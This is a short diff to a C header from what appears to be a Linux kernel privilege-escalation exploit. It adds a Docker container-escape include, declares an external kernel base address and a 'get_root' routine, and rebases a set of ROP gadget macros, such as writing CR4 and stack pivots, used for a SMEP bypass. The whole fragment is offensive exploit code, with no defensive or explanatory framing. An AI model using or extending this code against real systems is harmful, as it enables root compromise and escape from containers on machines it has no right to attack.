@@ -1,4 +1,5 @@
 #include "./kernel_infos.h"
+#include "./docker_escape.h"
 
 // Used when ENABLE_SMEP_BYPASS is used.
 // - xchg eax, esp ; ret
@@ -11,16 +12,18 @@
 // - xchg eax, edi ; ret
 // - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
 // - jmp rcx
-#define XCHG_EAX_ESP_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_esp_ret)
-#define POP_RDI_RET			(KERNEL_BASE + kernels[kernel].pop_rdi_ret)
-#define MOV_DWORD_PTR_RDI_EAX_RET	(KERNEL_BASE + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
-#define MOV_RAX_CR4_RET			(KERNEL_BASE + kernels[kernel].mov_rax_cr4_ret)
-#define NEG_RAX_RET			(KERNEL_BASE + kernels[kernel].neg_rax_ret)
-#define POP_RCX_RET			(KERNEL_BASE + kernels[kernel].pop_rcx_ret)
-#define OR_RAX_RCX_RET			(KERNEL_BASE + kernels[kernel].or_rax_rcx_ret)
-#define XCHG_EAX_EDI_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_edi_ret)
-#define MOV_CR4_RDI_RET			(KERNEL_BASE + kernels[kernel].mov_cr4_rdi_ret)
-#define JMP_RCX				(KERNEL_BASE + kernels[kernel].jmp_rcx)
+extern unsigned long kernel_base;
+extern void get_root(void);
+#define XCHG_EAX_ESP_RET		(kernel_base + kernels[kernel].xchg_eax_esp_ret)
+#define POP_RDI_RET			(kernel_base + kernels[kernel].pop_rdi_ret)
+#define MOV_DWORD_PTR_RDI_EAX_RET	(kernel_base + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
+#define MOV_RAX_CR4_RET			(kernel_base + kernels[kernel].mov_rax_cr4_ret)
+#define NEG_RAX_RET			(kernel_base + kernels[kernel].neg_rax_ret)
+#define POP_RCX_RET			(kernel_base + kernels[kernel].pop_rcx_ret)
+#define OR_RAX_RCX_RET			(kernel_base + kernels[kernel].or_rax_rcx_ret)
+#define XCHG_EAX_EDI_RET		(kernel_base + kernels[kernel].xchg_eax_edi_ret)
+#define MOV_CR4_RDI_RET			(kernel_base + kernels[kernel].mov_cr4_rdi_ret)
+#define JMP_RCX				(kernel_base + kernels[kernel].jmp_rcx)
 
 // * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *
 
